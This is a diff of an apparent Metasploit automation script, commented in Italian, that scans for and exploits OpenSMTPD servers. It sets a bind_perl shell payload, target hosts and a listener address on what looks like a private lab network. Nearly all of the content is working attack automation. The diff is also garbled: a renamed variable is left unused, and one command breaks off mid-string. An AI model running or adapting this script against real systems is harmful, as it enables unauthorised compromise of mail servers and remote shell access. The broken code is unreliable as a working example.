@@ -83,18 +83,17 @@
     def execute_attack()
 
         workspace = framework.datastore["WORKSPACE"]
-        targetIP = framework.datastore["TARGET_IP"]
+        targetIPs = framework.datastore["TARGET_IPS"]
         listeningIP = framework.datastore["LISTENING_IP"]
 
         # si sposta nel workspace specificato come parametro,
         # se non esiste lo crea in automatico
         run_single("workspace -a #{workspace}")
 
-        run_single("workspace -d #{workspace}") 
-        run_single("workspace -a #{workspace}") 
-        run_single("hosts -d 192.168.40.22") 
-        
-
+        if targetIP == "192.168.40.21" 
+            run_single("workspace -d #{workspace}") 
+            run_single("workspace -a #{workspace}") 
+            run_single("hos
         # PRE-EXPLOIT
         # seleziona come modulo attivo lo scanner di porte tcp
         run_single("use auxiliary/scanner/portscan/tcp")
@@ -121,7 +120,7 @@
         # che in quanto dipendenza di opensmtpd sarà installata sulla macchina vittima
         run_single("set payload cmd/unix/bind_perl")
         # imposta come obiettivo dell'exploit tutti i server opensmtpd
-        run_single("services -S opensmtpd -R")
+        #run_single("services -S opensmtpd -R")
         run_single("set RHOSTS #{targetIP}")
         # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
         run_single("set LHOST #{listeningIP}")
